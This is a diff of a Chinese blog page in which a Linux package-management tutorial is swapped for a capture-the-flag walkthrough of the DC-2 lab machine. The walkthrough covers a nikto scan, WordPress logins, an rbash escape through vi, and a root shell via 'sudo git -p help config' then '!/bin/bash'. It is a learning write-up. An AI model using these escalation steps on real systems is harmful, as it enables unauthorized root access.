+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -h 192.168.145.180</span><br></pre></td></tr></table></figure></div>
+
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/1bac5fa16c204b799a81ae3a42e3753c.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/424b7f04e12043ddbac5503e6460b17c.png"
                      
                 ></p>
-<p>安装多个软件包</p>
+<p>成功找到并且进入登录界面</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/1093a4ac79634cd0854cab49b18fcd70.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/8657d293653549b884b7073fe787d8f9.png"
                      
-                ></p>
-<p>安装指定版本的包</p>
-<p>apt install nginx&#x3D;（版本）</p>
-<p>安装本地的deb包</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/e1a04457161d4fb4bee922f47aa761ac.png"
-                     
-                ></p>
-<p>仅下载不安装</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/e53a6c2935d347949504cff7fc09746a.png"
-                     
-                ></p>
-<p>重新安装软件包</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/717dc1750c1540e5a66e5efeae03a4b8.png"
-                     
-                ></p>
-<p>安装推荐的包</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/767f8c8d330a4ba6812dcfed71df3761.png"
-                     
-                ></p>
-<p>不安装推荐的包</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/0c627a84559441c0b483e9bb805b7c11.png"
-                     
-                ></p>
-<p>软件包更新</p>
-<p>更新单个软件包</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/81dcb40560c5481db511887f68091f95.png"
-                     
-                ></p>
-<p>更新所有软件包</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/5e61532698904c86ae718eada104796e.png"
-                     
-                ></p>
-<p>完整升级</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/696f26a0b9eb46648d2ab3934c6201e7.png"
-                     
-                ></p>
-<p>发行版升级</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/677e59563e304427bb1da5299e199eb0.png"
-                     
-                ></p>
-<p>软件包卸载</p>
-<p>卸载，完全卸载</p>
-<p>apt (remove&#x2F;purge) nginx</p>
-<p>卸载不再需要的依赖</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/6e00c3d221b046ad9ae52de314a5c295.png"
-                     
-                ></p>
-<p>清理系统</p>
-<p>清理下载的包文件</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/b51b02abc1af4b1cbd5e50f35ab54d9c.png"
-                     
-                ></p>
-<p>清理旧版本的包文件</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/5f6ed830eaa644a7806712aa5c5361cf.png"
-                     
-                ></p>
-<p>组合清理命令</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/0ed61248ea3b4fd3a9b4a60f6a8917ec.png"
-                     
-                ></p>
-<h3 id="Ubuntu-22-04-Snap-包管理"><a href="#Ubuntu-22-04-Snap-包管理" class="headerlink" title="Ubuntu 22.04 - Snap 包管理"></a>Ubuntu 22.04 - Snap 包管理</h3><p>安装snap</p>
-<p>查看版本</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/6db30549e2ea40189c6b35388dbfde98.png"
-                     
-                ></p>
-<p>搜索软件包</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/9e469fa4fc754e96b6f56b1646ba1d0b.png"
-                     
-                ></p>
-<p>查看包的详细信息</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/4f70b79ea3ef40488b9597f95a07176d.png"
-                     
-                ></p>
-<p>列出已安装的snap</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/41e7f0bf352044079bcadb0163cfae6b.png"
-                     
-                ></p>
-<p>查看snap 占用的磁盘空间</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/e5afd478c6db4727af40375ccfabfc4f.png"
-                     
-                ></p>
-<p>安装snap包（稳定版本）’</p>
-<p>安装软件包</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/1d1f756cc8254512a2e87423f24ef40b.png"
-                     
-                ></p>
-<p>从特定频道安装</p>
-<p>snap install firefox –channel&#x3D;(beta&#x2F;edge)</p>
-<p>安装经典模式的snap</p>
-<p>snap install –classic code</p>
-<p>从本地文件安装</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/3c3c07dfc3c34d149706fa983b72d3c3.png"
-                     
-                ></p>
-<p>更新单个软件包</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/6647c845503940f99e7e18e0ae89ff92.png"
-                     
-                ></p>
-<p>更新所有软件包</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/ba477db36050453689506495273d30e3.png"
-                     
-                ></p>
-<p>切换到不同的频道</p>
-<p>snap refresh firefox –channel&#x3D;beta</p>
-<p>查看可用更新</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/3a61489748ac406ea81a6876928002a1.png"
-                     
-                ></p>
-<p>管理snap 版本</p>
-<p>查看已安装的版本</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/8fab1b9d0bd44ffe9ce996b7a6b86017.png"
-                     
-                ></p>
-<p>回滚到上一个版本&#x2F;特定版本</p>
-<p>snap revert firefox (–revision 1234)</p>
-<p>禁用自动更新（某个包）</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/8d9c3e4fe3834be7a4536277f587ebfd.png"
-                     
-                ></p>
-<p>！ 卸载软件包</p>
-<p>snap remove firefox</p>
-<p>卸载并删除所有版本和数据</p>
-<p>snap remove –purge firefox</p>
-<h3 id="常见问题与技巧"><a href="#常见问题与技巧" class="headerlink" title="常见问题与技巧"></a>常见问题与技巧</h3><p>依赖问题处理</p>
-<p>查看损坏的依赖</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/f4901e80f9fc4d438b2ae584139be31c.png"
-                     
-                ></p>
-<p>修复依赖问题</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/8485eb10f4f64a2694f65d8f79869b1f.png"
-                     
-                ></p>
-<p>跳过损坏的包</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/7a5f8999d4ae4fc8aaa4b7cfdbf5904c.png"
-                     
-                ></p>
-<h5 id="Ubuntu-22-04-APT"><a href="#Ubuntu-22-04-APT" class="headerlink" title="Ubuntu 22.04 (APT)"></a>Ubuntu 22.04 (APT)</h5><p>修复损坏的依赖</p>
-<p>apt –fix-broken install</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/a8adac632466448199582ee977acb475.png"
-                     
-                ></p>
-<p>强制修复</p>
+                >先用tom登录，成功，但是进去什么也没找到，刚好对应上flag1（被预判了…）</p>
+<p>所以用jerry试试..</p>
+<p>在pages里找到了flag2</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/f490379d2c3547f38449db1500b4b0b2.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/ec0eb7437aa64fa58ff63258d1da4d65.png"
                      
                 ></p>
-<p>锁文件问题</p>
-<p>rocky</p>
-<p>rm -f &#x2F;var&#x2F;run&#x2F;yum.pid</p>
-<p>ubuntu</p>
-<p>rm &#x2F;var&#x2F;lib&#x2F;apt&#x2F;lists&#x2F;lock</p>
-<p>查看包安装的文件</p>
-<p>rocky</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/231b08b768c94848bafe53fe985e5baa.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/d604001bafee4c1db170c012fd2de700.png"
                      
                 ></p>
-<p>查看文件属于哪个包</p>
+<p>translate:如果wordpress攻击不成功的话，还有另一条路，希望你能找到另一个攻击点</p>
+<p>所以：尝试7744的ssh攻击</p>
+<p>回到终端，用jerry链接显示permission denied</p>
+<p>用tom连接成功</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/7e955e600ec74dc59d9e59a56eb5f15a.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/44617671a1884564af0df797997a857d.png"
                      
                 ></p>
-<p>ubuntu</p>
-<p>查看已安装的包的文件列表</p>
+<p>ls，找到flag3.txt➡cat</p>
+<p>发现无法查看，被rbash（个人理解是只给用户提供最小权限的一个环境，会比一般shell限制的更多）限制了，所以下一步要从rbash里逃逸</p>
+<p>先看看usr里面有什么，发现bin文件里有四个命令</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/9829cab25b5c47fcb5730370dce6127f.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/dd5bd3fc046e47e89a5e62520bbea670.png"
                      
                 ></p>
-<p>查看文件属于哪个包</p>
+<p>可能是能使用的命令，用less看一下flag3.txt试一试，成功</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/75bae77957b4421ab51493bf1a0add39.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/69e165d61e5748418ff24bda1dbcfdf2.png"
                      
                 ></p>
-<p>下载包但不安装</p>
-<p>rocky</p>
+<p>translate：可怜的老tom总是追在jerry后面，他或许应该把承担的一切都su掉</p>
+<p>提示我们用su命令把tom用户转成jerry用户，但是现在权限受制</p>
+<p>用vi编辑器成功逃逸rbash</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/a464be08081447c6ac7d97f906d2abce.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/03228bee0ffd45ebb40f219d7488516e.png"
                      
                 ></p>
-<p>下载包及依赖</p>
+<p>ls之后发现flag4.txt</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/b79ab9eeab4f47abad6b419fbe6e6f8f.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/9cefe393a87f404a9946b763d0a83362.png"
                      
                 ></p>
-<p>指定下载目录</p>
+<p>translate:夸夸你，但是no，hints…走吧…</p>
+<p>无脑尝试先提权到root</p>
+<p>先sudo -l看看我都被允许用管理员权限运行哪些</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/671b115e5c8e4e08964a5f474ec73011.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/bc54291c17694d7da8bd8e2d6b0cf8d1.png"
                      
                 ></p>
-<p>ubuntu</p>
+<p>回显：jerry用户可以 <strong>以root权限</strong>运行git（版本控制系统）命令</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p help config</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure></div>
+
+<p>cd并且ls</p>
+<p>发现final-flag.txt!</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/0251a3a860264a6cb6b65db6224cd042.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/6559a1a71f254386864645df7a9f4857.png"
                      
                 ></p>
+<p>❀❀❀完结撒花！！❀❀❀</p>
 
 		</div>
 
@@ -1278,18 +926,18 @@ Rocky Linux8 -YUM/DNF包管理
 		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
 			<div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> Linux 软件包管理教程</li>
+        <li><strong>Title:</strong> dc系列——dc2</li>
         <li><strong>Author:</strong> Le_ee 博客等级 码龄1年</li>
         <li><strong>Created at
-                :</strong> 2025-11-24 09:17:46</li>
+                :</strong> 2025-11-27 04:20:06</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-11-24 17:19:22
+                    :</strong> 2025-11-27 12:21:03
             </li>
         
         <li>
-            <strong>Link:</strong> https://leei.site/2025/11/24/第六次作业_linux软件包管理/
+            <strong>Link:</strong> https://leei.site/2025/11/27/dc系列——dc2/
         </li>
         <li>
             <strong>
@@ -1316,9 +964,9 @@ Rocky Linux8 -YUM/DNF包管理
 			
 			
 			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="next" rel="next" href="/2025/11/18/rocky%20linux%208%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/">
+				<a class="next" rel="next" href="/2025/11/24/linux%E5%8C%85%E7%AE%A1%E7%90%86/">
 					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">RockyLinux8网络配置</span>
+						<span class="post-nav-title-item truncate max-w-48">Linux 软件包管理教程</span>
 						<span class="post-nav-item">Next posts</span>
 					</span>
 					<span class="right arrow-icon flex justify-center items-center">
@@ -1380,8 +1028,8 @@ Rocky Linux8 -YUM/DNF包管理
 		<div class="post-toc-wrap">
 	<div class="post-toc">
 		<div class="toc-title">On this page</div>
-		<div class="page-title">Linux 软件包管理教程</div>
-		<ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Ubuntu-22-04-APT-%E5%8C%85%E7%AE%A1%E7%90%86"><span class="nav-text">Ubuntu 22.04 - APT 包管理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Ubuntu-22-04-Snap-%E5%8C%85%E7%AE%A1%E7%90%86"><span class="nav-text">Ubuntu 22.04 - Snap 包管理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E4%B8%8E%E6%8A%80%E5%B7%A7"><span class="nav-text">常见问题与技巧</span></a></li></ol>
+		<div class="page-title">dc系列——dc2</div>
+		
 
 	</div>
 </div>
@@ -1408,7 +1056,7 @@ Rocky Linux8 -YUM/DNF包管理
                 
                 <p class="post-count space-x-0.5">
                     <span>
-                        8 posts in total
+                        9 posts in total
                     </span>
                     
                 </p>
